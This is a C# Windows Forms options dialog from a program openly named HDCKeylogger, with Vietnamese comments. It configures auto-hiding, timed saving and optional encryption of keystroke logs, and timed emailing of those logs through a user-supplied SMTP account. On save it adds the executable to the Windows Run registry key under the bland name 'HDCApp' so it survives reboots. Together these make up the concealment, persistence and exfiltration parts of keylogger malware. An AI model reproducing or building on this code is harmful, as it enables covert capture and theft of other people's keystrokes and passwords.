using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace HDCKeylogger
{
    public partial class frmOptions : Form
    {
        public frmOptions()
        {
            InitializeComponent();
        }

        private void frmOptions_Load(object sender, EventArgs e)
        {
            // Tab chung
            cbxStartUp.Checked = Properties.Settings.Default.StartUp;
            cbxAutoStart.Checked = Properties.Settings.Default.AutoStart;
            cbxAutoHide.Checked = Properties.Settings.Default.AutoHide;

            // Tab file
            if (Properties.Settings.Default.AutoSaveLogFile)
            {
                cbxAutoLogFile.Checked = true;
                groupBoxFile.Enabled = true;
                cbxEncryptFile.Enabled = true;
            }
            else
            {
                groupBoxFile.Enabled = false;
                cbxEncryptFile.Enabled = false;
            }

            txtLogDir.Text = Properties.Settings.Default.LogFilePath;
            nudFileLogTimer.Value = Properties.Settings.Default.LogFileTimer;
            cbxEncryptFile.Checked = Properties.Settings.Default.EncryptFile;

            // Tab Email
            if (Properties.Settings.Default.AutoSendEmail)
            {
                cbxAutoEmail.Checked = true;
                groupBoxEmail.Enabled = true;
            }
            else
            {
                groupBoxEmail.Enabled = false;
            }

            txtEmailAddress.Text = Properties.Settings.Default.EmailAddress;
            txtPassword.Text = Properties.Settings.Default.EmailPassword;
            txtSMTPHost.Text = Properties.Settings.Default.SMTPServer;
            nudSMTPPort.Value = Properties.Settings.Default.SMTPPort;
            cbxUseSSL.Checked = Properties.Settings.Default.UseSSL;
            nudEmailTimer.Value = Properties.Settings.Default.EmailTimer;
        }

        /// <summary>
        /// Khi tích vào tự động lưu log file
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void cbxAutoLogFile_CheckedChanged(object sender, EventArgs e)
        {
            if (cbxAutoLogFile.Checked)
            {
                groupBoxFile.Enabled = true;
                cbxEncryptFile.Enabled = true;
            }
            else
            {
                groupBoxFile.Enabled = false;
                cbxEncryptFile.Enabled = false;
            }
        }

        /// <summary>
        /// Tích vào tự động gửi email
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void cbxAutoEmail_CheckedChanged(object sender, EventArgs e)
        {
            if (cbxAutoEmail.Checked)
            {
                groupBoxEmail.Enabled = true;
            }
            else
            {
                groupBoxEmail.Enabled = false;
            }
        }

        /// <summary>
        /// Nhấn nút hủy
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnCancel_Click(object sender, EventArgs e)
        {
            Close();
        }

        /// <summary>
        /// Khi nhấn nút lưu
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnSave_Click(object sender, EventArgs e)
        {
            try
            {
                Properties.Settings.Default.StartUp = cbxStartUp.Checked;
                Properties.Settings.Default.AutoStart = cbxAutoStart.Checked;
                Properties.Settings.Default.AutoHide = cbxAutoHide.Checked;

                Properties.Settings.Default.AutoSaveLogFile = cbxAutoLogFile.Checked;
                Properties.Settings.Default.LogFilePath = txtLogDir.Text;
                Properties.Settings.Default.LogFileTimer = (int)nudFileLogTimer.Value;
                Properties.Settings.Default.EncryptFile = cbxEncryptFile.Checked;

                Properties.Settings.Default.AutoSendEmail = cbxAutoEmail.Checked;
                Properties.Settings.Default.EmailAddress = txtEmailAddress.Text;
                Properties.Settings.Default.EmailPassword = txtPassword.Text;
                Properties.Settings.Default.SMTPServer = txtSMTPHost.Text;
                Properties.Settings.Default.SMTPPort = (int)nudSMTPPort.Value;
                Properties.Settings.Default.EmailTimer = (int)nudEmailTimer.Value;
                Properties.Settings.Default.UseSSL = cbxUseSSL.Checked;

                Properties.Settings.Default.Save();

                MessageBox.Show("Đã lưu");
            }
            catch
            {
                MessageBox.Show("Vui lòng nhập chính xác cấu hình!");
            }

            try
            {
                // Ghi vào registry
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                if (cbxStartUp.Checked)
                    rk.SetValue("HDCApp", Application.ExecutablePath.ToString());
                else
                    rk.DeleteValue("HDCApp", false);
            }
            catch
            {
            }
        }

        /// <summary>
        /// Nhấn nút chọn folder
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void btnSelectFolder_Click(object sender, EventArgs e)
        {
            folderBrowserDialog.ShowDialog();
            txtLogDir.Text = folderBrowserDialog.SelectedPath;
        }
    }
}
